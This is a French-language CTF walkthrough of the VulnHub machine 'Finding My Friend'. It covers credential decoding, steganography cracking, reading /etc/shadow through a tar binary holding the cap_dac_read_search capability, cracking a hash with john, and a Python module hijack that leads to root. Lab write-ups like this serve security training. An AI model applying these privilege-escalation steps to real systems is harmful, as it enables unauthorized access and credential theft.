---
title: "Solution du CTF Finding My Friend de VulnHub"
tags: [CTF,VulnHub]
---

[Finding My Friend](https://vulnhub.com/entry/finding-my-friend-1,645/) s'est avéré être un CTF assez intéressant. Certes il repose sur un thème un peu trop enfantin et certains indices génèrent plus de confusion qu'autre chose, mais l'escalade de privilèges a été soigné sur ce CTF.

## Decodagogo

Trois services sont accessibles sur la machine dont un Apache qui livre une page sans grand intérêt.

```
Nmap scan report for 192.168.56.228
Host is up (0.00013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Via une énumération web je trouve un dossier `/friend`. La page d'index contient du base64 :

```html
<b>I can't read that. But it was like this</b>  <!-- NjMgNjEgNzAgNzQgNzUgNzIgNjUgM2EgNjggNzUgNmUgNzQgNjkgNmUgNjc= -->
```

Il s'avère que ce base64 se décode en une liste de valeurs hexadécimales. J'ai donc tenté de passer l'output à `xxd` :

```console
$ echo NjMgNjEgNzAgNzQgNzUgNzIgNjUgM2EgNjggNzUgNmUgNzQgNjkgNmUgNjc= | base64 -d | xxd -r
apture:hunting
```

On y était presque : pour une raison inconnue le premier caractère n'a pas été traite. Les identifiants à récupérer sont `capture` / `hunting`.

Ces derniers permettent un accès sur le FTP :

```console
$ ftp capture@192.168.56.228
Connected to 192.168.56.228.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
229 Entering Extended Passive Mode (|||46328|)
150 Here comes the directory listing.
drwxr-x---    2 1002     1002         4096 Jan 06  2021 .
drwxr-x---    2 1002     1002         4096 Jan 06  2021 ..
-rwxr-x---    1 1002     1002       430882 Jan 06  2021 .get.jpg
-rwxr-x---    1 1002     1002           29 Jan 06  2021 flag1.txt
-rwxr-x---    1 1002     1002        34608 Jan 06  2021 getme
-rwxr-x---    1 1002     1002           76 Jan 06  2021 note.txt
226 Directory send OK.
```

On obtient le premier flag : `tryhackme{Th1s1sJustTh3St4rt}`

Le fichier `.get.jpg` est d'une image d'une carte qui (vu le style) peut provenir d'un jeu vidéo.

Le fichier texte fonction ce message :

> I have an image but I’m not able to open it. Can you help me to open it?

Et enfin le fichier `getme` est visiblement un fichier PNG dont l'entête a été légèrement modifié :

```console
$ hexdump -n 32 -C getme
00000000  89 50 4f 47 5a 0a 1a 0a  00 00 00 0d 49 48 44 52  |.POGZ.......IHDR|
00000010  00 00 03 81 00 00 03 81  08 06 00 00 00 4f aa a5  |.............O..|
```

On devrait en effet voir `PNG` suivi de la valeur hexa `0x0d` au lieu de `POGZ`.

L'image corrigée n'apporte pas grand-chose d'intéressant. Au mieux je peux lancer `exiftool` dessus qui me remonte cette entrée (qui ne servira à rien comme vous verrez plus tard)  :

```
Rights                          : This might help you A@==:E@
```

## Steganogogo

J'ai tenté d'extraire du contenu depuis les images avec `stegoveritas` mais ça n'a rien donné.

Finalement j'ai trouvé le projet [GitHub - DominicBreuker/stego-toolkit: Collection of steganography tools - helps with CTF challenges](https://github.com/DominicBreuker/stego-toolkit) qui contient `stegoveritas` ainsi que d'autres programmes du même type.

Je l'ai utilisé, car il contient `stegdetect`, un vieil outil pour détecter si des données sont cachées dans une image :

```console
$ docker run -it --rm -v /tmp/ctf:/data dominicbreuker/stego-toolkit /bin/bash
Unable to find image 'dominicbreuker/stego-toolkit:latest' locally
latest: Pulling from dominicbreuker/stego-toolkit
219d2e45b4af: Pull complete 
b10ea90640fd: Pull complete 
7492abf8c090: Pull complete 
5ab731eb712d: Pull complete 
838f6d5acf58: Pull complete 
3556a1deff85: Pull complete 
b0b371aed21f: Pull complete 
Digest: sha256:f0669ac457ab2a3417390c48f9c35dfb9e503c68b5876b37bc6f1ced73a8c67a
Status: Downloaded newer image for dominicbreuker/stego-toolkit:latest
root@c4ce3dab62fd:/data# stegdetect .get.jpg 
.get.jpg : outguess(old)(***)
root@c4ce3dab62fd:/data# stegbreak -t o -f rockyou.txt .get.jpg 
Loaded 1 files...
Segmentation fault (core dumped)
```

Ici `stegdetect` a détecté l'utilisation de `outguess` pour cacher les données.

J'ai utilisé `stegbreak` derrière pour casser le mot de passe, mais non seulement c'était super lent, mais en plus le programme finit par crasher.

Après quelques recherches je suis tombé sur ce logiciel plus récent qui s'avérait prometteur :

[GitHub - RickdeJager/stegseek: Worlds fastest steghide cracker, chewing through millions of passwords per second](https://github.com/RickdeJager/stegseek)

Un docker est en plus présent pour ne pas se casser la tête avec les dépendances et la compilation :

```console
$ docker run --rm -it -v "$(pwd):/steg" rickdejager/stegseek /steg/.get.jpg /steg/rockyou.txt
Unable to find image 'rickdejager/stegseek:latest' locally
latest: Pulling from rickdejager/stegseek
a70d879fa598: Pull complete 
c4394a92d1f8: Pull complete 
10e6159c56c0: Pull complete 
2a9284816e0c: Pull complete 
da918f5114c3: Pull complete 
172662ab993b: Pull complete 
Digest: sha256:a3c6a82d5b7dd94dc49098c5080a70da8103b7ed3b3718423b3a70d4b43c9a8a
Status: Downloaded newer image for rickdejager/stegseek:latest
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "pollito"
[i] Original filename: "abcd.txt".
[i] Extracting to ".get.jpg.out".
```

Ça a été quasi instantané. On obtient alors ce code Morse :

```
.--- --- .... -. ---... -... --- --- --. .. . .-- --- --- --. .. .
```

J'ai eu recours au site `dcode.fr` :

[Code Morse - Alphabet - Traducteur, Convertisseur en Ligne](https://www.dcode.fr/code-morse)

On obtient les identifiants `JOHN:BOOGIEWOOGIE`.

## Capagogo

On se sert de leur version en minuscules pour l'accès SSH :

```console
$ ssh john@192.168.56.228
john@192.168.56.228's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-197-generic x86_64)
         ______ _           _ _               __  __         ______    _                _         
        |  ____(_)         | (_)             |  \/  |       |  ____|  (_)              | |        
        | |__   _ _ __   __| |_ _ __   __ _  | \  / |_   _  | |__ _ __ _  ___ _ __   __| |        
        |  __| | | '_ \ / _` | | '_ \ / _` | | |\/| | | | | |  __| '__| |/ _ \ '_ \ / _` |        
 _ _ _ _| |    | | | | | (_| | | | | | (_| | | |  | | |_| | | |  | |  | |  __/ | | | (_| |_ _ _ _ 
(_|_|_|_)_|    |_|_| |_|\__,_|_|_| |_|\__, | |_|  |_|\__, | |_|  |_|  |_|\___|_| |_|\__,_(_|_|_|_)
                                       __/ |          __/ |                                       
                                      |___/          |___/                                        

                                           .-"""-.
                                          / .===. \                       
                                         / / a a \ \                      
                                        / ( \___/ ) \                     
                             ________ooo\__\_____/__/___________          
                            /                                   \
                           |    Created by Team :- VIEH GROUP    |
                           | ----------------------------------- |
                           |    Visit us :- www.viehgroup.com    |
                           |     Twitter :- @viehgroup           |
                           | ----------------------------------- |
                           |    Kshitiz Raj (@manitorpotterk)    |
                           |     Avinash Nagar (@_alpha_03)      |
                           |     Rohit Burke(@Buggrammers)       |
                           | ----------------------------------- |
                            \________________________ooo________/
                                        /           \
                                       /:.:.:.:.:.:.:\
                                           |  |  |
                                           \==|==/
                                           /-Y-\
                                          (__/ \__)


 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 of these updates are security updates.
To see these additional updates run: apt list --upgradable


john@findingmyfriend:~$ id
uid=1003(john) gid=1003(john) groups=1003(john)
john@findingmyfriend:~$ sudo -l
[sudo] password for john: 
Sorry, user john may not run sudo on findingmyfriend.
john@findingmyfriend:~$ ls -al
total 32
drwxr-x--- 3 john john 4096 Jun  2 09:19 .
drwxr-xr-x 6 root root 4096 Jan  6  2021 ..
-rw-r----- 1 john john  220 Jan  6  2021 .bash_logout
-rw-r----- 1 john john 3771 Jan  6  2021 .bashrc
drwx------ 2 john john 4096 Jun  2 09:19 .cache
-rwxr-x--- 1 john john   92 Jan  6  2021 clue.txt
-rwxr-x--- 1 john john   29 Jan  6  2021 flag2.txt
-rw-r----- 1 john john  655 Jan  6  2021 .profile
john@findingmyfriend:~$ cat flag2.txt 
tryhackme{gI33fuIbutM0r3t0gO}
```

L'indice dans le fichier texte est le suivant :

> You need to find which college is she studying.  
> 
> Hint: Her brother parth knows that.

En cherchant les fichiers de l'utilisateur `parth` je n'ai rien trouvé d'intéressant.

L'utilisatrice honey a un dossier caché qui pourrait avoir une valeur plus tard :

```console
john@findingmyfriend:/home$ find / -user honey -ls 2> /dev/null 
   257205      4 drwxr-xr-x   3 honey    honey        4096 Jan  6  2021 /home/honey
   257209      4 -rwxr-x---   1 honey    honey          28 Jan  6  2021 /home/honey/flag4.txt
   257206      4 -rw-r--r--   1 honey    honey        3771 Jan  6  2021 /home/honey/.bashrc
   257207      4 -rw-r--r--   1 honey    honey         220 Jan  6  2021 /home/honey/.bash_logout
   257212      0 -rw-r--r--   1 honey    honey           0 Jan  6  2021 /home/honey/.sudo_as_admin_successful
   257208      4 -rw-r--r--   1 honey    honey         655 Jan  6  2021 /home/honey/.profile
   257210      4 drwxrwx---   2 honey    parth        4096 Jan  6  2021 /home/honey/...
```

Finalement j'ai lancé `LinPEAS` qui m'a remonté le binaire `tar` à un emplacement inhabituel et une `capability` encore plus inhabituelle.

```
Files with capabilities (limited to 50):
/etc/fonts/tar = cap_dac_read_search+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr = cap_net_raw+ep
```

Cette dernière est documentée sur [Linux Capabilities - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_read_search) :

> [**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows a process to **bypass file read, and directory read and execute permissions**.

Du coup je peux utiliser cette copie de `tar` pour récupérer des fichiers sans me soucier des permissions :

```console
john@findingmyfriend:~$ /etc/fonts/tar cz /home/parth/ > parth.tar.gz
/etc/fonts/tar: Removing leading `/' from member names
john@findingmyfriend:~$ tar zvtf parth.tar.gz 
drwxr-x--- parth/parth       0 2021-01-06 07:45 home/parth/
-rw-r----- parth/parth    3771 2021-01-06 07:45 home/parth/.bashrc
-rw-r----- parth/parth     220 2021-01-06 07:45 home/parth/.bash_logout
-rw-r----- parth/parth     655 2021-01-06 07:45 home/parth/.profile
-rwxr-x--- parth/parth      31 2021-01-06 07:45 home/parth/flag3.txt
-rwxr-x--- parth/parth      33 2021-01-06 07:45 home/parth/honey.txt
```

Ce nouveau flag est `tryhackme{Sh3is@lm0stn3@rtoY0u}`.

Le fichier texte est le suivant :

> My home directory might help you.

Faisons donc la même chose avec le dossier personnel de `honey`.

J'obtiens le dernier flag :

```console
john@findingmyfriend:~/home/honey$ cat flag4.txt 
tryhackme{F1n@llyIFInD3dH3r}
```

Je trouve aussi un hash dans son `.viminfo` :

```
# Registers:
""1     LINE    0
        vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
"2      LINE    0
        vagrant:$6$TQ3BtU5J$93pEgAS3/UuePOKzGaWGNb1qyBEFsefSU1FmK1pLC6H1BiL7szqsM2/AvdrQT9FH0YrkNLcIaVn7vUtHmMWTi/:18606:0:99999:7:::

# File marks:
'0  31  0  /etc/passwd
'1  31  0  /etc/shadow
```

Toutefois l'utilisateur n'existe plus sur le système.

Il y a aussi un script Python qui est dans le dossier `...` :

```python
#!/usr/bin/env python3
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/tmp/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/findingmyfriend', zipf)
    zipf.close()
```

## Importagogo

Ce script ne semble pas être lancé via une crontab car `/tmp/website.zip` n'est pas présent.

Je n'ai pas non plus à ce stade de droits sur le dossier `...` que j'ai pu lire seulement grâce à la capability.

Du coup, on va fouiller plus large, d'abord en récupérant des données dans `/etc` grâce à la copie de `tar`.

Première étape le fichier `shadow` :

```
root:*:18606:0:99999:7:::
--- snip ---
capture:$6$HqYJbJ5G$OcJoMXbIu0/jr/5UNOf9Umpz4nXofQS7GFOx6Ssa8ELMwX9.ZBTDydnBx61GS5.jaya/g7rnJ0pPjxdeXDZU91:18633:0:99999:7:::
john:$6$P/3fSZeV$sdKm375fkWx07zaj06FMnM3zlcdUUD6OjgLsu6YJ2/mHQIMeuxXO.4sa06NtPITVQPsUvbK4smjTZ1g9zcFOX/:18633:0:99999:7:::
parth:$6$MYtc8Brt$BjgnNAIrRDJkejEyPAU3rwbO3VpukkfF3ztmHRPAUf9vh4oX8DRS3YJ9oxo4ab4AfK1Bpdhj2P5R17QUzzPZg.:18633:0:99999:7:::
honey:$6$SnSiiciv$sZxnWUie/dfKxgORvJ4BeBuetOArGmVVNoSbJ.5YqSjBuUn/6Te5TlwCKrjOG8H.Xk.ebzywSytPxKtxTWo391:18633:0:99999:7:::
```

On remarque qu'on ne peut pas se connecter à root via la saisie d'un mot de passe (pas de hash).

Ensuite un tour sur les entrées `sudoers` :

```console
john@findingmyfriend:~/etc$ cat sudoers.d/honey 
honey  ALL=(ALL) NOPASSWD:ALL
john@findingmyfriend:~/etc$ cat sudoers.d/parth 
parth ALL = (honey) NOPASSWD: /home/honey/.../backup.py
```

On peut se faire une idée des étapes à suivre. D'abord casser le hash de `parth` :

```console
$ john --wordlist=.rockyou.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Remaining 2 password hashes with 2 different salts
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
johnnydepp       (parth)
```

Avec ce compte, on ne peut pas modifier `backup.py` mais on peut écrire dans le dossier parent. On va utiliser le fait que Python aille d'abord chercher les modules dans le dossier courant :

```console
parth@findingmyfriend:/home/honey/...$ ls -al .
total 12
drwxrwx--- 2 honey parth 4096 Jan  6  2021 .
drwxr-xr-x 3 honey honey 4096 Jan  6  2021 ..
-r-xr-xr-x 1 honey honey  358 Jan  6  2021 backup.py
parth@findingmyfriend:/home/honey/...$ echo -e 'import pty\npty.spawn("/bin/bash")' > zipfile.py
parth@findingmyfriend:/home/honey/...$ sudo -u honey /home/honey/.../backup.py
bash: /home/parth/.bashrc: Permission denied
honey@findingmyfriend:/home/honey/...$ sudo su
root@findingmyfriend:/home/honey/...# cd /root
root@findingmyfriend:~# ls
root@findingmyfriend:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Une fois le shell `honey` récupéré on utilise ses permissions `sudo` pour passer root.
